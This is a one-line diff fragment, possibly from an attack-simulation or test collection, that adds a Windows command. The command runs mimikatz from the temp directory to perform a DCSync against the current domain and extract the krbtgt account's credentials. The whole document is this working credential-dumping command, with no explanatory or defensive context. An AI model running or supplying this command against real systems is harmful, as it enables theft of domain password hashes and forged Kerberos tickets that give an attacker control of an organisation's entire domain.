@@ -1,0 +1,1 @@
+%tmp%\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"
